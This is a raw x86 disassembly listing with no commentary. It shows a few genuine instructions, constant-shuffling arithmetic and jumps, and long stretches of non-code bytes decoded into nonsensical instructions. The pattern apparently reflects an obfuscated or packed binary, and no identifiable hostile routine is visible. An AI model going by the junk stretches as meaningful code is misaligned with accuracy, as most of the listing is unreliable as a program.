  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	sub    eax,0xd7dd70e8
  41fb67:	(bad)  
  41fb68:	sar    BYTE PTR [esi-0x41413bb6],0x55
  41fb6f:	push   esp
  41fb70:	or     DWORD PTR [edx+0x56cc6565],0x8ed290f1
  41fb7a:	push   edi
  41fb7b:	rcr    DWORD PTR [edi+0x35],cl
  41fb7e:	dec    edx
  41fb7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb80:	clc    
  41fb81:	in     al,dx
  41fb82:	test   eax,0x148427ad
  41fb87:	pop    esi
  41fb88:	xor    ecx,esi
  41fb8a:	inc    eax
  41fb8b:	mov    al,0xe0
  41fb8d:	or     eax,0xf258fc79
  41fb92:	sub    ecx,eax
  41fb94:	imul   esp,DWORD PTR [esi]
  41fb97:	fs dec edx
  41fb99:	arpl   WORD PTR [ebx+0x49],si
  41fb9c:	aam    0x96
  41fb9e:	add    BYTE PTR [edi],cl
  41fba0:	jmp    0x41fbee
  41fba2:	outs   dx,BYTE PTR ds:[esi]
  41fba3:	sbb    DWORD PTR [ebp-0x33233049],eax
  41fba9:	cmp    DWORD PTR fs:[ebp+0x4aec6982],0x68
  41fbb1:	loopne 0x41fbab
  41fbb3:	mov    WORD PTR [edx+eax*4-0x24],?
  41fbb7:	out    0xc8,al
  41fbb9:	jle    0x41fbd9
  41fbbb:	mov    dh,0x68
  41fbbd:	div    DWORD PTR [edi+esi*8+0x39]
  41fbc1:	aam    0x92
  41fbc3:	xlat   BYTE PTR ds:[ebx]
  41fbc4:	jns    0x41fc3f
  41fbc6:	out    dx,al
  41fbc7:	mov    ebx,0x7e20de7
  41fbcc:	out    0x86,al
  41fbce:	test   DWORD PTR [esi-0x59],esp
  41fbd1:	mov    bl,dl
  41fbd3:	cdq    
  41fbd4:	arpl   dx,bp
  41fbd6:	imul   ecx,DWORD PTR [eax+0x72],0x1300963e
  41fbdd:	pop    ds
  41fbde:	jp     0x41fbd0
  41fbe0:	loope  0x41fc61
  41fbe2:	lods   eax,DWORD PTR ds:[esi]
  41fbe3:	jae    0x41fba3
  41fbe5:	and    eax,0x1aee68da
  41fbea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fbeb:	cmp    DWORD PTR [edi-0x1774afee],0x7d819112
  41fbf5:	shr    BYTE PTR [esi+0x3cb9b966],0x16
  41fbfc:	lods   al,BYTE PTR ds:[esi]
  41fbfd:	(bad)  
  41fbff:	into   
  41fc00:	or     BYTE PTR [ebp+0x61e046db],al
  41fc06:	pop    ebp
  41fc07:	cmp    BYTE PTR [edx-0x33],al
  41fc0a:	mov    DWORD PTR [ecx],ecx
  41fc0c:	sbb    eax,0x7d8bc6c5
  41fc11:	(bad)  
  41fc13:	ret    
  41fc14:	mov    ch,BYTE PTR [edi-0x25cdbece]
  41fc1a:	loope  0x41fbd7
  41fc1c:	jae    0x41fc52
  41fc1e:	jno    0x41fc2c
  41fc20:	cmp    DWORD PTR [eax-0x20],eax
  41fc23:	ret    0xdcea
  41fc26:	inc    eax
  41fc27:	call   0x32d1:0xa31944f1
  41fc2e:	call   0x77d9:0xb9693f0f
  41fc35:	je     0x41fbca
  41fc37:	mov    ds:0x966083fb,eax
  41fc3c:	loop   0x41fc9a
  41fc3e:	add    al,0x9f
  41fc40:	cli    
  41fc41:	or     al,0xf5
  41fc43:	and    eax,0x75fbeaa3
  41fc48:	data16 adc BYTE PTR [ebp+0x58a2fe39],ah
  41fc4f:	jmp    0x41fc9f
  41fc51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc52:	data16 mov ?,WORD PTR [edi]
  41fc55:	mov    ch,0x6
  41fc57:	hlt    
  41fc58:	and    eax,0x1410b555
  41fc5d:	fist   WORD PTR [ecx+eiz*2]
  41fc60:	dec    edi
  41fc61:	mov    ds:0xdb26d719,al
  41fc66:	xchg   ebx,eax
  41fc67:	in     eax,dx
  41fc68:	cli    
  41fc69:	lahf   
  41fc6a:	xchg   ebp,eax
  41fc6b:	mov    dh,0xdc
  41fc6d:	sbb    dl,bl
  41fc6f:	call   0x3020:0x53db9871
  41fc76:	shl    edi,1
  41fc78:	jmp    0x41fcbc
  41fc7a:	adc    esp,DWORD PTR [eax-0xd178b1c]
  41fc80:	imul   edx,esi,0xf8d4fe5f
  41fc86:	and    dh,BYTE PTR [ecx-0x3d]
  41fc89:	mov    ?,eax
  41fc8b:	jo     0x41fcf4
  41fc8d:	or     al,0x3
  41fc8f:	arpl   WORD PTR [ebp-0x18],cx
  41fc92:	add    eax,0x757650ae
  41fc97:	sbb    al,0x43
  41fc99:	push   edi
  41fc9a:	or     dl,BYTE PTR [edi-0x5]
  41fc9d:	out    dx,al
  41fc9e:	mov    ds:0xac5ba5d,al
  41fca3:	adc    al,0x3e
  41fca5:	push   ebp
  41fca6:	add    eax,0x235c5950
  41fcab:	push   ds
  41fcac:	mov    bh,0x84
  41fcae:	not    DWORD PTR gs:[ebp+0x5c]
  41fcb2:	xor    DWORD PTR [edi+eiz*1+0x79fd79ab],esp
  41fcb9:	mov    eax,ds:0x9af8e4ee
  41fcbe:	and    ah,0xd1
  41fcc1:	push   ecx
  41fcc2:	fmul   DWORD PTR [ebx]
  41fcc4:	mov    DWORD PTR [ecx-0x5e],edx
  41fcc7:	mov    esi,0x1f85534e
  41fccc:	sub    ah,al
  41fcce:	push   ss
  41fccf:	mov    eax,0x6284cffd
  41fcd4:	mov    dh,0x8e
  41fcd6:	cwde   
  41fcd7:	mov    cl,0x6e
  41fcd9:	loope  0x41fc98
  41fcdb:	pop    ds
  41fcdc:	lock ins BYTE PTR es:[edi],dx
  41fcde:	or     DWORD PTR [ebx-0x64f31126],esi
  41fce4:	sub    BYTE PTR ds:0x19317b15,cl
  41fcea:	out    dx,al
  41fceb:	dec    ebx
  41fcec:	pushf  
  41fced:	(bad)  
  41fcef:	pop    ds
  41fcf0:	shr    BYTE PTR gs:[ebx-0x9],0xfa
  41fcf5:	arpl   WORD PTR [esi],di
  41fcf7:	sti    
  41fcf8:	xchg   ecx,edi
  41fcfa:	mov    DWORD PTR [ebp+0x5507a97c],edi
  41fd00:	loope  0x41fcb3
  41fd02:	int3   
  41fd03:	retf   
  41fd04:	fst    DWORD PTR [ecx-0x782d8433]
  41fd0a:	xor    edx,edx
  41fd0c:	sub    bl,bh
  41fd0e:	pusha  
  41fd0f:	mov    esp,0x494e83b9
  41fd14:	cmp    BYTE PTR [ebx+0x70],0xfd
  41fd18:	leave  
  41fd19:	dec    eax
  41fd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd1b:	int    0x50
  41fd1d:	fnstenv [ecx+0x3]
  41fd20:	pop    ss
  41fd21:	xchg   esi,eax
  41fd22:	mov    fs,WORD PTR [esi-0x2b32b71a]
  41fd28:	cmp    al,0xea
  41fd2a:	pop    ecx
  41fd2b:	jp     0x41fd3a
  41fd2d:	and    dh,0x4a
  41fd30:	adc    ch,BYTE PTR [edi+0x6c765a3d]
  41fd36:	pushf  
  41fd37:	dec    eax
  41fd38:	ds (bad) 
  41fd3a:	xor    DWORD PTR [ebx-0x636da932],eax
  41fd40:	out    dx,al
  41fd41:	(bad)  
  41fd42:	xchg   esi,eax
  41fd43:	aam    0x67
  41fd45:	pushf  
  41fd46:	push   ecx
  41fd47:	inc    esp
  41fd48:	xor    BYTE PTR [eax+0x23],ah
  41fd4b:	rcl    BYTE PTR [eax-0x4e5bdf3f],1
  41fd51:	into   
  41fd52:	sti    
  41fd53:	jbe    0x41fcdb
  41fd55:	iret   
  41fd56:	mov    al,0xca
  41fd58:	ret    0x5d55
  41fd5b:	test   al,0x98
  41fd5d:	outs   dx,BYTE PTR ds:[esi]
  41fd5e:	mov    dl,0x5e
  41fd60:	jl     0x41fd15
  41fd62:	inc    edx
  41fd63:	xor    al,0xc7
  41fd65:	adc    edi,DWORD PTR [esi-0x2b15ea47]
  41fd6b:	add    eax,0xef0238f
  41fd70:	mov    esp,0x4677ddfd
  41fd75:	cli    
  41fd76:	ins    BYTE PTR es:[edi],dx
  41fd77:	sub    ebx,eax
  41fd79:	ficomp WORD PTR [esp+esi*4]
  41fd7c:	fdiv   DWORD PTR ds:0x1b63703c
  41fd82:	pop    es
  41fd83:	jae    0x41fd99
  41fd85:	fbld   TBYTE PTR [ebx]
  41fd87:	mov    al,0x19
  41fd89:	add    DWORD PTR [ebp-0x670a38d5],edi
  41fd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd90:	dec    ebp
  41fd91:	mov    DWORD PTR [edi],eax
  41fd93:	les    edx,FWORD PTR [eax-0x1a]
  41fd96:	push   DWORD PTR [ebx-0x797d4687]
  41fd9c:	lds    esp,FWORD PTR [edi-0x38]
  41fd9f:	out    dx,al
  41fda0:	test   al,0x86
  41fda2:	cmc    
  41fda3:	or     eax,0xde43238f
  41fda8:	inc    eax
  41fda9:	lock adc edx,DWORD PTR [ebx]
  41fdac:	jmp    0x41fe23
  41fdae:	ror    BYTE PTR [eax],cl
  41fdb0:	loopne 0x41fda2
  41fdb2:	ja     0x41fda8
  41fdb4:	lea    ecx,[eax+0x3c7df79d]
  41fdba:	leave  
  41fdbb:	push   es
  41fdbc:	xor    dl,BYTE PTR [ebx-0x6c]
  41fdbf:	sbb    esi,edi
  41fdc1:	inc    ebx
  41fdc2:	or     ebx,DWORD PTR cs:[edx-0x48]
  41fdc6:	cli    
  41fdc7:	xor    ch,BYTE PTR [edi+0x58d01c5b]
  41fdcd:	inc    edx
  41fdce:	mov    bh,0x59
  41fdd0:	mov    al,ds:0x6c21ec7f
  41fdd5:	and    BYTE PTR es:[ecx+0x2f069070],ah
  41fddc:	test   DWORD PTR [ebx-0x45b2c8ab],esp
  41fde2:	cwde   
  41fde3:	push   ebx
  41fde4:	(bad)  
  41fde5:	adc    al,0x3c
  41fde7:	test   eax,0x2c1c2794
  41fdec:	or     eax,0x3a8aa3a3
  41fdf1:	repnz bound ebp,QWORD PTR ds:0x752a590e
  41fdf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdf9:	sbb    BYTE PTR [ecx],bl
  41fdfb:	xchg   ecx,eax
  41fdfc:	adc    al,0xf6
  41fdfe:	rol    DWORD PTR [eax+ecx*4-0x48ab05f8],cl
  41fe05:	or     edx,0x6edcb8fd
  41fe0b:	mov    ebx,0x8bfaf1dc
  41fe10:	and    eax,0xde81aedf
  41fe15:	stc    
  41fe16:	hlt    
  41fe17:	sub    ecx,DWORD PTR [ecx]
  41fe19:	mul    cl
  41fe1b:	xlat   BYTE PTR ds:[ebx]
  41fe1c:	and    al,0xff
  41fe1e:	dec    ecx
  41fe1f:	jno    0x41fe96
  41fe21:	or     al,0xe4
  41fe23:	mov    ebx,0x3562021d
  41fe28:	xchg   esi,eax
  41fe29:	ret    0x1423
  41fe2c:	xchg   esp,eax
  41fe2d:	(bad)  
  41fe2e:	xchg   edx,eax
  41fe2f:	gs dec ecx
  41fe31:	lahf   
  41fe32:	jl     0x41fe76
  41fe34:	(bad)  
  41fe35:	adc    ah,BYTE PTR [esi]
  41fe37:	ds jmp 0x41fe7b
  41fe3a:	add    al,0x7d
  41fe3c:	ins    BYTE PTR es:[edi],dx
  41fe3d:	or     BYTE PTR [edx],0x2c
  41fe40:	mov    esi,0x63dae1fd
  41fe45:	jmp    0x41fdef
  41fe47:	sub    esi,esp
  41fe49:	jbe    0x41fe5c
  41fe4b:	nop
  41fe4c:	push   0xede2069f
  41fe51:	dec    esp
  41fe52:	mul    ebx
  41fe54:	test   BYTE PTR [ebp-0x5e],dh
  41fe57:	mov    eax,0x4f12b794
  41fe5c:	(bad)  
  41fe5d:	lea    esp,[eax-0x3e]
  41fe60:	and    ecx,ebp
  41fe62:	fmul   QWORD PTR [esi-0x3e]
  41fe65:	aam    0xe
  41fe67:	pop    es
  41fe68:	icebp  
  41fe69:	push   ecx
  41fe6a:	inc    esi
  41fe6b:	in     eax,0x14
  41fe6d:	rol    DWORD PTR [edx+0x14bfdca3],0x86
  41fe74:	cmp    eax,0x737aa3a4
  41fe79:	retf   0xc9e8
  41fe7c:	sub    ebx,DWORD PTR [edx]
  41fe7e:	sub    eax,DWORD PTR [ebp+0x4a75b7e9]
  41fe84:	jns    0x41fe70
  41fe86:	out    dx,eax
  41fe87:	lods   al,BYTE PTR ds:[si]
  41fe89:	gs das 
  41fe8b:	pop    esp
  41fe8c:	in     al,0x82
  41fe8e:	jne    0x41fe46
  41fe90:	add    ch,BYTE PTR ds:0x7497d373
  41fe96:	cli    
  41fe97:	outs   dx,DWORD PTR ds:[esi]
  41fe98:	cmc    
  41fe99:	sbb    BYTE PTR [ecx+ebp*4],dl
  41fe9c:	push   ecx
  41fe9d:	inc    esp
  41fe9e:	jle    0x41feb6
  41fea0:	in     eax,0x3d
  41fea2:	push   ss
  41fea3:	jecxz  0x41fe4d
  41fea5:	inc    edi
  41fea6:	pop    eax
  41fea7:	add    DWORD PTR [esi+0x43],esp
  41feaa:	fld    st(0)
  41feac:	lods   eax,DWORD PTR ds:[esi]
  41fead:	sti    
  41feae:	retf   0x96a0
  41feb1:	xlat   BYTE PTR ds:[ebx]
  41feb2:	sub    edx,DWORD PTR [edi]
  41feb4:	mov    ah,0xac
  41feb6:	cwde   
  41feb7:	rol    esi,1
  41feb9:	jne    0x41fee7
  41febb:	add    cl,ah
  41febd:	xchg   ebp,eax
  41febe:	loop   0x41fee8
  41fec0:	mov    ch,0x8f
  41fec2:	add    dh,al
  41fec4:	add    al,0x75
  41fec6:	pusha  
  41fec7:	mov    esp,0x19afa5f5
  41fecc:	fs mov bh,0x3f
  41fecf:	arpl   sp,bp
  41fed1:	mov    cl,BYTE PTR [ebx+edi*2-0x71864ed3]
  41fed8:	inc    edi
  41fed9:	adc    esp,DWORD PTR [ecx+0x6d043beb]
  41fedf:	retf   0x4fd5
  41fee2:	je     0x41fee5
  41fee4:	cmp    DWORD PTR [ebx+edi*4],eax
  41fee7:	mov    ebp,0xc1f97e60
  41feec:	enter  0x526a,0x6e
  41fef0:	mov    ebx,DWORD PTR [esi+0x6b09b161]
  41fef6:	mov    BYTE PTR [ebx+0x4c79f592],bl
  41fefc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fefd:	and    edi,DWORD PTR [edx]
  41feff:	xchg   esp,eax
  41ff00:	adc    al,0x26
  41ff02:	mov    bl,0x6c
  41ff04:	lea    ebp,[ebx+0x5b]
  41ff07:	leave  
  41ff08:	scas   eax,DWORD PTR es:[edi]
  41ff09:	lahf   
  41ff0a:	xor    BYTE PTR [esi-0x73c46aaa],ah
  41ff10:	sub    BYTE PTR [esi+0xf],ah
  41ff13:	push   edx
  41ff14:	or     eax,0xb248fcb1
  41ff19:	cmp    bl,ch
  41ff1b:	or     eax,0xa66be4c7
  41ff20:	inc    edx
  41ff21:	outs   dx,DWORD PTR ds:[esi]
  41ff22:	pusha  
  41ff23:	fld    TBYTE PTR [esi+0x57356cb6]
  41ff29:	dec    ebp
  41ff2a:	popa   
  41ff2b:	add    al,0xaf
  41ff2d:	xor    BYTE PTR [eax],ah
  41ff2f:	add    bl,BYTE PTR [esi]
  41ff31:	cmp    al,BYTE PTR [edx+0x43]
  41ff34:	xor    al,BYTE PTR [ecx+ecx*8]
  41ff37:	shl    DWORD PTR [ebx],0xd2
  41ff3a:	push   0x3
  41ff3c:	pop    ecx
  41ff3d:	div    ecx
  41ff3f:	mov    ecx,DWORD PTR [ebp-0x40]
  41ff42:	or     eax,ecx
  41ff44:	mov    ecx,DWORD PTR [ebp-0x54]
  41ff47:	xor    edx,edx
  41ff49:	div    ecx
  41ff4b:	imul   eax,eax,0x7d53
  41ff51:	jmp    0x420338
  41ff56:	xor    DWORD PTR [ebx],edx
  41ff58:	(bad)  
  41ff59:	in     al,dx
  41ff5a:	scas   eax,DWORD PTR es:[edi]
  41ff5b:	imul   edi,DWORD PTR [ebx-0x57113e5],0xffffffa4
  41ff62:	sbb    bh,BYTE PTR [eax-0x6a9c5b37]
  41ff68:	sar    BYTE PTR [esi-0x41413bb6],0xe8
  41ff6f:	(bad)  
  41ff70:	not    DWORD PTR [ebx-0x49e48800]
  41ff76:	cs dec ecx
  41ff78:	cli    
  41ff79:	pop    edi
  41ff7a:	dec    eax
  41ff7b:	jae    0x41ff0a
  41ff7d:	loopne 0x41ffb4
  41ff7f:	push   ss
  41ff80:	xor    DWORD PTR [esi-0x50],ebx
  41ff83:	adc    eax,0xecd5ca3c
  41ff88:	das    
  41ff89:	xlat   BYTE PTR ds:[ebx]
  41ff8a:	mov    WORD PTR [ecx+0x64],?
  41ff8d:	in     al,0xdf
  41ff8f:	leave  
  41ff90:	sbb    eax,0x91045f44
  41ff95:	je     0x41ff28
  41ff97:	call   0x1295:0x441a8598
  41ff9e:	scas   al,BYTE PTR es:[edi]
  41ff9f:	and    al,0x2f
  41ffa1:	fidiv  WORD PTR [edi-0x5d]
  41ffa4:	pop    esp
  41ffa5:	cs mov dl,0x9b
  41ffa8:	push   ebx
  41ffa9:	jae    0x420016
  41ffab:	mov    eax,ds:0xcc27276b
  41ffb0:	bound  edx,QWORD PTR [edi+0x16285629]
  41ffb6:	jge    0x41ff4d
  41ffb8:	and    eax,0x18f60d10
  41ffbd:	rcl    BYTE PTR [eax],1
  41ffbf:	and    dh,BYTE PTR [esi-0x2a]
  41ffc2:	jecxz  0x41ffdd
  41ffc4:	cmp    bl,BYTE PTR ds:0x8b79b4b3
  41ffca:	inc    eax
  41ffcb:	jo     0x420018
  41ffcd:	inc    ecx
  41ffce:	iret   
  41ffcf:	push   esi
  41ffd0:	ret    0x1b44
  41ffd3:	ja     0x420020
  41ffd5:	dec    ebp
  41ffd6:	jmp    0x728c190d
  41ffdb:	add    BYTE PTR [ecx+0x54302984],ah
  41ffe1:	jp     0x420046
  41ffe3:	inc    eax
  41ffe4:	rol    DWORD PTR [ebx+0x6d],1
  41ffe7:	addr16 inc ebx
  41ffe9:	xchg   esp,eax
  41ffea:	mul    BYTE PTR [ebx]
  41ffec:	dec    esi
  41ffed:	sub    eax,DWORD PTR fs:[ebx+0x46]
  41fff1:	fwait
  41fff2:	(bad)  
  41fff4:	imul   ebx,DWORD PTR [ecx+eiz*8+0x38],0x14
  41fff9:	lahf   
  41fffa:	jno    0x41ff87
  41fffc:	mov    ds:0xf4b94df9,eax
  420001:	cmp    al,0x38
  420003:	add    edx,DWORD PTR [edi]
  420005:	inc    esp
  420006:	(bad)  
  420007:	scas   eax,DWORD PTR es:[edi]
  420008:	xchg   edx,eax
  420009:	stc    
  42000a:	aaa    
  42000b:	mov    ch,0x1f
  42000d:	sahf   
  42000e:	add    al,0xf6
  420010:	nop
  420011:	push   0xc5328bcf
  420016:	call   FWORD PTR [eax-0x64]
  420019:	dec    ebp
  42001a:	mov    ah,0xf6
  42001c:	push   ecx
  42001d:	ret    
  42001e:	mov    ds:0x48c69a42,al
  420023:	pop    edx
  420024:	cdq    
  420025:	(bad)  
  420026:	inc    edi
  420027:	add    al,0x2
  420029:	es adc al,0x48
  42002c:	push   es
  42002d:	cmp    ecx,DWORD PTR [eax-0x45fe0b70]
  420033:	sbb    ch,BYTE PTR [edi+0x5f]
  420036:	ins    DWORD PTR es:[edi],dx
  420037:	mov    cl,BYTE PTR [edx-0x37]
  42003a:	call   0xff79:0x673a511a
  420041:	jecxz  0x420048
  420043:	dec    esi
  420044:	pop    ss
  420045:	add    BYTE PTR [ecx-0x485ba47c],ch
  42004b:	add    eax,0xf8188080
  420050:	jns    0x42005c
  420052:	push   ebx
  420053:	fmul   DWORD PTR [esp+ecx*8+0x650f987f]
  42005a:	pop    esp
  42005b:	aam    0xd0
  42005d:	dec    ebp
  42005e:	pusha  
  42005f:	and    ebp,DWORD PTR [ebx-0x1324665d]
  420065:	lods   al,BYTE PTR ds:[esi]
  420066:	mov    ecx,0x63c9cecc
  42006b:	xchg   ebp,eax
  42006c:	mov    ebp,0x87516c39
  420071:	mov    edx,0x26328067
  420076:	dec    edx
  420077:	push   esp
  420078:	popa   
  420079:	inc    esp
  42007a:	xchg   esi,eax
  42007b:	sahf   
  42007c:	sar    DWORD PTR [ecx],1
  42007e:	pop    edx
  420080:	fstp   DWORD PTR [eax-0x50]
  420083:	test   DWORD PTR [eax+0x703eb6f1],0xf5309ae1
  42008d:	or     eax,esp
  42008f:	fisubr WORD PTR [esi]
  420091:	add    al,0x32
  420093:	sbb    bh,dh
  420095:	push   ebx
  420096:	mov    ebx,0xec3d6b13
  42009b:	js     0x42010e
  42009d:	jae    0x42011e
  42009f:	fidiv  DWORD PTR [esi-0x48]
  4200a2:	push   ebp
  4200a3:	xor    BYTE PTR [ebx],bh
  4200a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4200a6:	xor    dl,BYTE PTR [ebp-0x30]
  4200a9:	mov    gs,WORD PTR [eax+eax*8]
  4200ac:	loopne 0x42006a
  4200ae:	add    ebx,DWORD PTR [ebx-0x6b]
  4200b1:	cwde   
  4200b2:	xchg   ebp,eax
  4200b3:	and    cl,al
  4200b5:	mov    esp,0xf900c37
  4200ba:	shr    DWORD PTR [edi-0x14ddece1],1
  4200c0:	mov    ecx,0xd9a17b08
  4200c5:	jmp    0x420130
  4200c7:	sahf   
  4200c8:	and    DWORD PTR [ebx+edx*2-0x5c],esi
  4200cc:	fmulp  st(3),st
  4200ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200d0:	les    edx,FWORD PTR [ecx+0x3e36fd0]
  4200d6:	mov    ebp,0x39eb1133
  4200db:	sahf   
  4200dc:	xor    eax,0x866ecae
  4200e1:	imul   eax,DWORD PTR [edx+0x4dec584a],0xffffffd1
  4200e8:	or     ebx,DWORD PTR [edi-0x2]
  4200eb:	ret    
  4200ec:	jle    0x4200d0
  4200ee:	cmc    
  4200ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200f0:	cld    
  4200f1:	and    cl,BYTE PTR [eax+0x26709914]
  4200f7:	je     0x420164
  4200f9:	or     al,0xd
  4200fb:	push   edi
  4200fc:	dec    ebp
  4200fd:	popa   
  4200fe:	or     edx,DWORD PTR [edi]
  420100:	lods   eax,DWORD PTR ds:[esi]
  420101:	loop   0x420138
  420103:	aad    0x8e
  420105:	push   dx
  420107:	jmp    0x42015e
  420109:	xor    eax,0x3e8e9029
  42010e:	push   ecx
  42010f:	sub    al,0xa5
  420111:	xchg   BYTE PTR [esi],bh
  420113:	xchg   DWORD PTR [edx+0x63593556],edx
  420119:	(bad)  
  42011b:	add    DWORD PTR [esi],esi
  42011d:	dec    ebx
  42011e:	pop    edx
  42011f:	mov    ah,0x1b
  420121:	ret    
  420122:	mov    DWORD PTR [ecx-0x429c0a29],edi
  420128:	ins    BYTE PTR es:[edi],dx
  420129:	in     eax,0x85
  42012b:	clc    
  42012c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42012d:	mov    ch,0x28
  42012f:	call   0x125eb5f8
  420134:	sub    cl,ch
  420136:	mov    eax,ds:0x36126516
  42013b:	lea    edx,[ecx-0x2]
  42013e:	pop    es
  42013f:	or     ebx,esp
  420141:	test   eax,0xc92b476f
  420146:	js     0x4200fd
  420148:	call   0x1f42e34b
  42014d:	jmp    0xa8842ad4
  420152:	fbld   TBYTE PTR ss:[ebx+eiz*4]
  420156:	into   
  420157:	xchg   BYTE PTR [ecx],dl
  420159:	(bad)  
  42015a:	sub    al,0x5d
  42015c:	mov    dl,0xc7
  42015e:	xor    edx,DWORD PTR [edi-0xc]
  420161:	popf   
  420162:	push   ds
  420163:	mov    ds:0x4429dfb,eax
  420168:	fdivr  st,st(5)
  42016a:	es repz inc ebx
  42016d:	iret   
  42016e:	inc    ebp
  42016f:	stos   DWORD PTR es:[edi],eax
  420170:	sbb    al,0xaf
  420172:	daa    
  420173:	(bad)
  420177:	mov    DWORD PTR [edi],edx
  420179:	test   al,0x3b
  42017b:	int3   
  42017c:	xchg   ebp,eax
  42017d:	and    ch,0xd5
  420180:	jl     0x4201d3
  420182:	jae    0x4201b5
  420184:	cmc    
  420185:	pop    ebp
  420186:	cmp    cl,BYTE PTR ss:[edx]
  420189:	rcl    DWORD PTR [ebp+0x6e],cl
  42018c:	stos   BYTE PTR es:[edi],al
  42018d:	pop    ebp
  42018e:	(bad)  
  42018f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420190:	fadd   DWORD PTR [ebx+0x30]
  420193:	jmp    0x420194
  420195:	fdiv   QWORD PTR [edx]
  420197:	dec    ebx
  420198:	loope  0x4201c4
  42019a:	sub    al,0xc0
  42019c:	mov    edx,DWORD PTR [ebp+0x76]
  42019f:	out    0xed,eax
  4201a1:	push   ds
  4201a2:	cwde   
  4201a3:	and    al,0x5b
  4201a5:	mov    al,ds:0xa1ad4389
  4201aa:	ss add bl,dh
  4201ad:	push   eax
  4201ae:	fsubr  QWORD PTR [edi+0x5d93d9f5]
  4201b4:	mov    dh,0xfa
  4201b6:	sub    ch,BYTE PTR [eax+0x33]
  4201b9:	shr    DWORD PTR [edx],cl
  4201bb:	inc    edi
  4201bc:	(bad)  
  4201bd:	jne    0x4201ad
  4201bf:	add    eax,esi
  4201c1:	pop    ss
  4201c2:	rol    BYTE PTR [edi],0x7d
  4201c5:	rol    DWORD PTR ds:0x1df62280,1
  4201cb:	(bad)  
  4201cc:	xor    al,0xd8
  4201ce:	adc    DWORD PTR [ecx-0x7dfc31ce],edx
  4201d4:	xor    ch,0x6c
  4201d7:	inc    esi
  4201d8:	scas   al,BYTE PTR es:[edi]
  4201d9:	push   ebx
  4201da:	push   0x1f
  4201dc:	data16 jbe 0x420259
  4201df:	pop    DWORD PTR [edi-0x10e09765]
  4201e5:	inc    ebx
  4201e6:	xchg   edi,eax
  4201e7:	inc    ebx
  4201e8:	outs   dx,BYTE PTR ds:[esi]
  4201e9:	xor    dl,BYTE PTR [edi+0x727e28b1]
  4201ef:	jmp    0xd9d820a2
  4201f4:	cld    
  4201f5:	loope  0x420215
  4201f7:	mov    bh,0x5b
  4201f9:	(bad)  
  4201fa:	mov    ebx,0xc4cdbd53
  4201ff:	lods   al,BYTE PTR ds:[esi]
  420200:	mov    ecx,0x46e0edfc
  420205:	int    0x68
  420207:	xor    cl,ch
  420209:	jmp    0x420245
  42020b:	mov    al,ds:0x8a2d9255
  420210:	repz inc ecx
  420212:	iret   
  420213:	lods   al,BYTE PTR ds:[esi]
  420214:	call   0x9a178b43
  420219:	test   al,0x88
  42021b:	pop    DWORD PTR [ecx+0x476271c0]
  420221:	dec    ecx
  420222:	pop    ecx
  420223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420224:	xchg   edx,eax
  420225:	mov    al,0x62
  420227:	test   eax,0x2dd8188b
  42022c:	mov    ebp,0xd287011
  420231:	xor    al,0x26
  420233:	ror    BYTE PTR [ebx+0x48],cl
  420236:	push   ds
  420237:	sub    al,0x37
  420239:	ins    BYTE PTR es:[edi],dx
  42023a:	leave  
  42023b:	pop    eax
  42023c:	inc    eax
  42023d:	rol    BYTE PTR ds:0x418c416c,0x16
  420244:	mov    ah,ah
  420246:	sbb    BYTE PTR fs:[ecx],cl
  420249:	ffreep st(3)
  42024b:	xchg   edx,eax
  42024c:	cmp    BYTE PTR [edi+edx*1+0x60],ch
  420250:	fcomp  DWORD PTR [ebp+0x1f678ba6]
  420256:	ja     0x42028a
  420258:	in     eax,dx
  420259:	xchg   ebx,eax
  42025a:	cmp    al,0xcf
  42025c:	mov    bl,0xb4
  42025e:	inc    esp
  42025f:	shl    BYTE PTR [edi],0x19
  420262:	stos   BYTE PTR es:[edi],al
  420263:	enter  0xe050,0xd2
  420267:	test   DWORD PTR [esi+esi*1+0x22],0x548209f8
  42026f:	mov    ?,esi
  420271:	stos   BYTE PTR es:[edi],al
  420272:	es faddp st(0),st
  420275:	cmpxchg BYTE PTR ds:0x60e62d42,bh
  42027c:	ins    DWORD PTR es:[edi],dx
  42027d:	sub    cl,ch
  42027f:	(bad)  
  420281:	cmp    DWORD PTR [edx+0x17b6ee0b],ebx
  420287:	xchg   ebx,eax
  420288:	aaa    
  420289:	mov    ebx,0xdec5e251
  42028e:	lods   al,BYTE PTR ss:[esi]
  420290:	es jns 0x4202ad
  420293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420294:	push   0xc6051389
  420299:	push   cs
  42029a:	add    esp,DWORD PTR [ecx-0x11]
  42029d:	cmp    esi,DWORD PTR [esi+0x44]
  4202a0:	enter  0x1872,0xff
  4202a4:	mov    ecx,0xd3e73502
  4202a9:	xlat   BYTE PTR ds:[ebx]
  4202aa:	xlat   BYTE PTR ds:[ebx]
